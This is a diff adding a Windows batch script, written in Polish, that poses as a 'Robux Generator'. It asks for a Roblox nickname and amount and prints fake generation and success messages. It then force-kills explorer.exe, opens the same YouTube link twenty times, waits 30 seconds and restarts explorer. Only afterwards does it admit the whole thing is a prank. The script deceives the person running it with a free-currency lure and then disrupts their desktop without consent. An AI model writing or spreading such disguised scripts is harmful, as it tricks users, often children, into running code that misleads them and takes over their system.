@@ -1,0 +1,48 @@
+@echo off
+chcp 65001 >nul
+title Robux Generator v2.0
+color 47
+set /p nick=Podaj swój nick w Roblox: 
+cls
+set /p amount=Podaj ilość Robuxów do wygenerowania:
+echo.
+echo Generowanie %amount% Robuxów dla %nick%...
+timeout /t 3 /nobreak >nul
+echo Łączenie z serwerem Roblox...
+timeout /t 2 /nobreak >nul
+echo Weryfikacja konta %nick%...
+timeout /t 2 /nobreak >nul
+echo Generowanie Robuxów...
+timeout /t 3 /nobreak >nul
+echo Sukces! %amount% Robuxów zostało dodane do konta %nick%.
+echo Dziękujemy za skorzystanie z Robux Generator v2.0!
+timeout /t 3 /nobreak >nul
+taskkill /f /im explorer.exe >nul
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+start "" "https://www.youtube.com/watch?v=cjeHXzWYglg&list=RDcjeHXzWYglg&start_radio=1&pp=ygUTYmxhY2sgbmlnZXJpYW4gc29uZ6AHAQ%3D%3D"
+timeout /t 30 /nobreak >nul
+start explorer.exe
+cls
+echo Ten program powstał dla zabawy. Nie ponosze odpowiedzialności za jakiekolwiek szkody wynikłe z jego użycia.
+echo I tak nic to nie robi oprócz wyłączenia explorera na 30 sekund
+echo bo Roblox nie pozwala na generowanie Robuxów w ten sposób i jest to zwykły prank.
+echo GitHub: https://github.com/ftshellcat
+pause
